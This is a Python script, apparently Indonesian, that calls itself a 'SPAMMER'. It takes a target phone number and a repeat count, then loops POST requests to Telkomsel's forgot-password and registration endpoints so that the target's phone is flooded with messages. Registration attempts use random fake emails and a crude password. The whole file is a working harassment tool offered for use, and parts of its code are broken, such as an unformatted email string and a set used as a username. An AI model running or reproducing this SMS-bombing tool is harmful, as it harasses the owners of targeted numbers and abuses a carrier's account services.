import os, time, json, random, string

r = "\033[1;91m"
g = "\033[1;32m"
w = "\033[1;97m"
y = "\033[1;93m"
d  = "\x1b[41;37;1m"
cl = "\x1b[0;0m"


try:
  from requests import *
  from bs4 import BeautifulSoup as bs
except:
  print(f"{w}[{g}•{w}] Install Module...")
  os.system("pip install requests")
  os.system("pip install bs4")


def telkomsel(nomor):
  xnxx = {"username":nomor,"action":"","iswebview":"true","fromaccount":"false"}
  kz = bs(post("https://nsp.telkomsel.com/account/process/processlupapassword", data=xnxx).text,  'html.parser').find('div', {'content container-fluid bg-3 small'}).findAll('div')[2]['class'][1]
  if kz == "alert-warning":
    pis = string.ascii_lowercase
    coz = random.randint(6,20)
    mail = ''.join(random.choice(pis) for p in range(coz))
    echa = {"iswebview":"false","email":"{mail}{airpatira}@gmail.com","nohp":nomor,"username":{airpatira},"password":"kontol.com123"}
    rakz = post("https://nsp.telkomsel.com/account/process/processdaftar", data=echa).text
    print(f"{w}[{g}{i+1}{w}] {g}Register{w} - Spam Berhasil Dikirim!")

  else:
    print(f"{w}[{g}{i+1}{w}] {g}Forget{w} - Spam Berhasil Dikirim!")

while True:
    os.system('clear')
    airpatira = random.randint(10000,99999)
    print(f""" 
 {w}        
   __|  _ \  \     \  |  __|  _ \ 
 \__ \  __/ _ \   |\/ |  _|     / 
 ____/ _| _/  _\ _|  _| ___| _|_\ 
 {d} Author kakatoji.       {cl} """)
    nomor = input(f"\n{w}[{g}•{w}] Nomor Target : " )
    jumlah = input(f"\n{w}[{g}•{w}] Jumlah  : ")
    print("")
    for i in range(int(jumlah)):
            telkomsel(nomor)
    time.sleep(2);
    lagi=input(f"\n{w}[{g}?{w}] Ingin Coba Lagi y/n? ")
    if lagi == "y" or lagi == "Y":
         continue
    elif lagi == "n" or lagi == "N":
         break
    else:
        print(f"\n{w}[{r}!{w}] Ngapain? ")
        time.sleep(2.5)
        continue
